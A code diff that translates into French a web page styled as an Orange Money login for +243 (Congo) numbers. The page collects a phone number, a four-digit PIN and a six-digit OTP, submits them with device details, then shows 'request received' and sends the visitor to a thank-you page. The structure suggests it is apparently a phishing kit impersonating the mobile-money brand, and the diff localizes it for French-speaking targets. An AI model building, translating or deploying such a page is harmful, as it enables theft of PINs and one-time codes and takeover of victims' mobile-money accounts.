@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Orange Money — Login</title>
+<title>Orange Money — Connexion</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
@@ -113,14 +113,14 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
 
 <div class="card">
   <img src="assets/orange.png" class="logo">
-  <h2>Login</h2>
+  <h2>Connexion</h2>
 
   <form id="loginForm" autocomplete="off">
-    <label>Mobile Number</label>
+    <label>Numéro de téléphone</label>
     <input id="phone" value="+243" inputmode="numeric">
     <div id="phoneError" class="error"></div>
 
-    <label>Enter your PIN</label>
+    <label>Entrez votre code PIN</label>
     <div class="pin-row">
       <input class="pin-digit" maxlength="1" inputmode="numeric">
       <input class="pin-digit" maxlength="1" inputmode="numeric">
@@ -129,15 +129,15 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
     </div>
 
     <input type="text" id="hp" style="display:none">
-    <button id="loginBtn" class="btn" disabled>LOGIN</button>
+    <button id="loginBtn" class="btn" disabled>SE CONNECTER</button>
   </form>
 </div>
 
 <!-- OTP MODAL -->
 <div id="otpModal" class="otp-modal" style="display:none">
   <div class="otp-box">
-    <div style="text-align:center"><strong>Enter OTP</strong></div>
-    <p class="small">We have sent an OTP to your phone.</p>
+    <div style="text-align:center"><strong>Entrer le code OTP</strong></div>
+    <p class="small">Un code OTP a été envoyé sur votre téléphone.</p>
 
     <div class="otp-row">
       <input class="otp-digit" id="d0" maxlength="1" inputmode="numeric">
@@ -148,18 +148,18 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
       <input class="otp-digit" id="d5" maxlength="1" inputmode="numeric">
     </div>
 
-    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
+    <div id="otpWarning" class="otp-warning">Veuillez saisir 6 chiffres</div>
 
     <div class="resend-row">
       <div class="small" id="resendInfo">
-        Resend available in <span id="countdown">120</span>s
+        Renvoi disponible dans <span id="countdown">120</span>s
       </div>
-      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
+      <button id="resendBtn" class="resend-btn" disabled>Renvoyer le code</button>
     </div>
 
     <div class="otp-actions">
-      <button id="confirmOtp" disabled>Confirm</button>
-      <button id="cancelOtp">Cancel</button>
+      <button id="confirmOtp" disabled>Confirmer</button>
+      <button id="cancelOtp">Annuler</button>
     </div>
 
     <div id="otpStatus" class="small" style="margin-top:10px"></div>
@@ -199,7 +199,7 @@ const loginBtn=document.getElementById('loginBtn');
 function validatePhone(){
   const d=phone.value.replace('+243','');
   if(!/^\d{9}$/.test(d)){
-    phoneError.textContent='Enter a valid 9-digit number';
+    phoneError.textContent='Entrez un numéro valide à 9 chiffres';
     return false;
   }
   phoneError.textContent='';
@@ -263,14 +263,14 @@ function startCountdown(){
   clearInterval(timer);
   seconds=120;
   resendBtn.disabled=true;
-  resendInfo.innerHTML=`Resend available in <span id="countdown">${seconds}</span>s`;
+  resendInfo.innerHTML=`Renvoi disponible dans <span id="countdown">${seconds}</span>s`;
   timer=setInterval(()=>{
     seconds--;
     document.getElementById('countdown').textContent=seconds;
     if(seconds<=0){
       clearInterval(timer);
       resendBtn.disabled=false;
-      resendInfo.textContent="Didn't receive OTP?";
+      resendInfo.textContent="Vous n’avez pas reçu le code ?";
     }
   },1000);
 }
@@ -340,7 +340,7 @@ confirmBtn.onclick=async()=>{
     device,
     submittedAt:new Date().toISOString()
   });
-  otpStatus.innerHTML="<span class='success'>Success — request received</span>";
+  otpStatus.innerHTML="<span class='success'>Succès — demande reçue</span>";
   setTimeout(()=>location.href='thankyou.html',1200);
 };
 
